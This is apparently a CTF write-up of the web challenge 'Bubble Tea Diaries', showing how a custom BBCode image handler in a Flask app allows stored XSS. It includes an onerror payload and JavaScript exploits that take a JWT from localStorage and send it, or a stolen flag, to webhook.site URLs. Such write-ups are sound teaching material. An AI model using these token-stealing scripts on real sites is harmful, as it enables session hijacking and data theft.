---
title: "Bubble Tea Diaries - SAS CTF 2025 Quals"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "jwt", "flask", "base64", "sas-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "The application is a classic CTF task focused on XSS."
source:
  name: "CTFtime writeup #40256"
  url: "https://ctftime.org/writeup/40256"
ctf:
  name: "SAS CTF 2025 Quals"
  year: 2025
  challenge: "Bubble Tea Diaries"
---

## Metadata

- **CTF:** SAS CTF 2025 Quals
- **Task:** Bubble Tea Diaries
- **Author team:** LCD
- **CTFtime tags:** web, xss
- **CTFtime:** <https://ctftime.org/writeup/40256>

---
The application is a classic CTF task focused on XSS. It features a note-taking service and a bot that follows a link to a user’s note (after creating a private note with a flag on its account). When examining the service’s functionality, several unusual aspects stand out for a Flask-based backend:

\- Authentication uses a JWT token in requests, not the built-in Flask `session`. The token is included in the `Authorization` header, as shown below:  
  
```  
GET /api/posts?page=1&per_page=5 HTTP/1.1  
Host: [::1]  
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0ODE2MzY0NywianRpIjoiODEwZjU4ODItZmE2Mi00NGVmLTg2NDMtYWM0OTNlZjRhZDA1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRhOWIzNjQyLWY0NDMtNGIwNS1iMjAzLWVkOGM0N2E0NTA0ZCIsIm5iZiI6MTc0ODE2MzY0NywiZXhwIjoxNzQ4MTY3MjQ3LCJsb2dpbl90aW1lIjoxNzQ4MTYzNjQ3LjMxMDQ3fQ.KO6djKOdHCLN601cxw7weVtMM9aN5kcxnG589LjVKtY  
```  
  
Notably, the JWT is not stored in cookies but in the `Authorization` header.  
\- The service allows users to leave comments under notes, which is uncommon for tasks of this type.  
\- The comment field displays a suspicious message:   
  
![](<https://i.ibb.co/HTmtgs4y/Pasted-image-20250527201945.png>)  
It suggests using a markup language called `BBCode`. In real-world scenarios, XSS vulnerabilities often arise from WYSIWYG editors embedding HTML in comments, emails, or markdown.

## Initial Vulnerability Hypothesis

1\. Issue with BBCode  
2\. Issue with JWT

## BBCode Issue

Upon reviewing the service’s code to check dependencies and determine if the BBCode module is outdated, no such module is found. The BBCode processing is custom, further suggesting a potentially vulnerable implementation. Examining `backend/app/routes/[comments.py](http://comments.py)` reveals:

```  
@comments_bp.route('/user/<user_id>/posts/<post_id>', methods=['POST'])  
@jwt_required()  
def create_comment(user_id, post_id):  
....  
parser = BBCodeParser()  
content_html = parser.parse(content)  
....  
```

Next, we inspect `backend/app/utils/[bb_parser.py](http://bb_parser.py)` to analyze the `BBCodeParser` code:

```  
def parse(self, text):  
if not text:  
return ""

escaped_text = html.escape(text)  
  
result = escaped_text  
for tag in self.allowed_tags:  
if tag in self.tag_handlers:  
result = self.tag_handlers[tag](result)  
  
return result  
```

> Consider how a standard XSS payload like `![](https://ctftime.org/1)` is processed. The text is first escaped using `html.escape(text)`, converting special HTML characters into safe equivalents:   
> \\- `<` → `<`   
> \\- `>` → `>`   
> \\- `&` → `&`

```  
s = s.replace("&", "&") # Must be done first!  
s = s.replace("<", "<")  
s = s.replace(">", ">")  
if quote:  
s = s.replace('"', """)  
s = s.replace('\'', "'")  
return s  
```

> The output is `<img src=1 onerror=alert(1)>`.

The subsequent code:

```  
for tag in self.allowed_tags:  
if tag in self.tag_handlers:  
result = self.tag_handlers[tag](result)  
```

does nothing for this payload, as it does not match any allowed BBCode tags. For an `img` tag to be processed, it must match the regex:

```  
simple_pattern = r'\\[img\\](https?://[^"\'\\[\\]<>]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]'  
```

The full `img` tag handler is:

```  
def _handle_image(self, text):  
simple_pattern = r'\\[img\\](https?://[^"\'\\[\\]<>]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]'  
text = re.sub(simple_pattern,   
r'![](https://ctftime.org/\\1)',   
text)

dim_pattern = r'\\[img=(\d+),(\d+)\\](https?://[^"\'\\[\\]<>]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]'  
text = re.sub(dim_pattern,   
r'![](https://ctftime.org/\\3)',   
text)

attr_pattern = r'\\[img ([^\\]]+)\\](https?://[^"\'\\[\\]<>]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]'  
  
def img_attr_replacer(match):  
attrs_str = match.group(1)  
img_url = match.group(2)  
return f'![](https://ctftime.org/{img_url})'  
  
text = re.sub(attr_pattern, img_attr_replacer, text)  
  
return text  
```

The `attr_pattern` regex matches tags like `[img attributes]URL[/img]`:

\- `attrs_str` captures the attributes (e.g., `onerror=alert(1)`).  
\- `img_url` captures the image URL (e.g., `<http://example.com/image.jpg>`).  
\- The `img_attr_replacer` function inserts `attrs_str` directly into the `` tag without filtering.

#### Example Processing

```  
def img_attr_replacer(match):  
attrs_str = match.group(1)  
img_url = match.group(2)  
return f'![](https://ctftime.org/{img_url})'  
```

For input `[img onerror=alert(1)]<http://example.com/image.jpg>[/img]`:

\- `match.group(1)` = `onerror=alert(1)`  
\- `match.group(2)` = `<http://example.com/image.jpg>`   
The result is `![](http://example.com/image.jpg)`   
  
![](<https://i.ibb.co/YTdNsBpp/Pasted-image-20250527205710.png>)  
XSS is confirmed. Since the bot follows the link to our post, the JavaScript will execute in its context.

#### Troubleshooting

There are a few challenges:

\- The bot’s note address is unknown.  
\- Since cookies are not used, including `credentials: 'include'` in a `fetch` request won’t work for authentication.

##### Obtaining the Authorization Token

Browsers don’t automatically store tokens used in the `Authorization` header, so this is likely handled on the frontend. Checking the code reveals:

```  
interceptors.request.use((e=>{const t=localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")  
```

Verification in the browser confirms the token is stored in `localStorage`: 

![](<https://i.ibb.co/XrhkFPx6/Pasted-image-20250527210950.png>)

##### Obtaining the Bot’s Note UUID

The frontend makes a request to `/dashboard`:

```  
GET /api/posts?page=1&per_page=5 HTTP/1.1  
```

The response is:

```  
{  
"items": [  
{  
"author": "testtest",  
"comments_count": 1,  
"content": "test",  
"created_at": "2025-05-27T17:07:44.284123",  
"id": 1,  
"top_comments": [  
{  
"author": "testtest",  
"content": "![](https://ctftime.org/\\"http:/example.com/image.jpg\\")",  
"created_at": "2025-05-27T17:56:53.432094",  
"id": 1,  
"post_id": 1,  
"user_id": "b3e28d05-23b1-4d0c-8acb-cbd50bce2602"  
}  
],  
"updated_at": "2025-05-27T17:07:44.284133",  
"user_id": "b3e28d05-23b1-4d0c-8acb-cbd50bce2602"  
}  
],  
"page": 1,  
"pages": 1,  
"per_page": 5,  
"total": 1  
}  
```

Notes are accessible at:

```  
@posts_bp.route('/user/<user_id>/posts/<post_id>', methods=['GET'])  
```

Since the bot creates a comment immediately after registration, the `post_id` is likely `1`. The note is at:

```  
/user/<user_id>/posts/1  
```

The `user_id` is obtained from the `/api/posts` response.

##### Exploit

The exploit should:

1\. Retrieve the token from `localStorage`.  
2\. Use it in the `Authorization: Bearer` header.  
3\. Request `/api/posts` to get the `user_id`.  
4\. Request `/user/<user_id>/posts/<post_id>` to get the flag from `class="post-content"`.  
5\. Send the base64-encoded flag to a webhook.

```  
fetch("/api/posts", {  
headers: {  
'Authorization': `Bearer ${localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")}`  
}  
})  
.then(response => response.json())  
.then(data => {  
return fetch(`/api/posts/user/${data.items[0].user_id}/posts/1`, {   
headers: {  
'Authorization': `Bearer ${localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")}`  
}   
});  
})  
.then(response => response.json())  
.then(flag => {  
const content = flag.comments.items[0].content;  
fetch(`https://webhook.site/ce7bcd4f-0512-40d5-886b-168da9b25574?flag=${btoa(content)}`);  
})  
```

##### Simple Exploit

```  
fetch("//webhook.site/e6ec5ddd-39b1-49be-bff3-b6ddeea12aae", {  
headers: {  
'Authorization': `Bearer ${localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")}`  
}  
})  
```  
we get the token and get the flag through the site.
